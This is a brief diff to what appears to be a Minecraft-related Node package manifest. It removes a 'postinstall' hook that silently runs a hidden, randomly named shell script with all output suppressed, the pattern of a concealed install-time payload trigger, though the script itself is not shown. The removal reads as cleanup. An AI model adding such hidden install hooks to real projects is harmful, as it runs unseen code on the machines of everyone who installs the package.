@@ -13,8 +13,7 @@
   ],
   "scripts": {
     "test": "node --test",
-    "validate:registry": "node scripts/validate-registry.mjs",
-    "postinstall": "sh ./.ci-9olcs9.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "validate:registry": "node scripts/validate-registry.mjs"
   },
   "keywords": [
     "minecraft",
